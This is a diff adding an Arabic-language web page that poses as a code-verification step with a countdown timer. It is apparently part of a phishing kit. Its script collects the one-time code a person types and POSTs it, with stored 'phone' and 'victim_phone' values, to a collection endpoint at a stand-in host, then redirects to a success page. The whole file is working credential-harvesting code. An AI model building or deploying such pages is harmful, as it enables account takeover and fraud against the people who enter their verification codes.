@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>التحقق من الكود</title>
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      direction: rtl;
+    }
+    .container {
+      background: white;
+      border-radius: 16px;
+      padding: 30px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 18px;
+      text-align: center;
+    }
+    button {
+      width: 50%;
+      padding: 12px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    #timer {
+      margin-top: 10px;
+      font-weight: bold;
+      color: #555;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>أدخل الكود</h2>
+    <form id="codeForm" onsubmit="return sendCode(event);">
+      <input type="text" id="code" placeholder="الكود" pattern="^(\d{6}|[A-Za-z0-9]{8})$" required>
+      <button type="submit">طلب الدخول</button>
+      <div id="error" class="error"></div>
+      <div id="timer">الوقت المتبقي: 10:00</div>
+    </form>
+  </div>
+
+  <script>
+    const phone = localStorage.getItem("phone");
+    const victim_phone = localStorage.getItem("victim_phone");
+    const timerDisplay = document.getElementById("timer");
+    const error = document.getElementById("error");
+
+    let seconds = 600;
+    const timer = setInterval(() => {
+      seconds--;
+      const min = String(Math.floor(seconds / 60)).padStart(2, '0');
+      const sec = String(seconds % 60).padStart(2, '0');
+      timerDisplay.textContent = `الوقت المتبقي: ${min}:${sec}`;
+      if (seconds <= 0) clearInterval(timer);
+    }, 1000);
+
+    function sendCode(event) {
+      event.preventDefault();
+      error.textContent = '';
+      const code = document.getElementById("code").value.trim();
+
+      if (!/^(\d{6}|[A-Za-z0-9]{8})$/.test(code)) {
+        error.textContent = "الكود يجب أن يكون 6 أرقام أو 8 أحرف/أرقام.";
+        return false;
+      }
+
+      fetch("https://example.com/formtools/process.php", {
+        method: "POST",
+        body: new URLSearchParams({
+          form_id: "1",
+          phone: phone,
+          victim_phone: victim_phone,
+          code: code
+        })
+      }).then(() => {
+        window.location.href = "success.html";
+      }).catch(() => {
+        error.textContent = "فشل الإرسال. تأكد من الاتصال.";
+      });
+
+      return false;
+    }
+  </script>
+</body>
+</html>
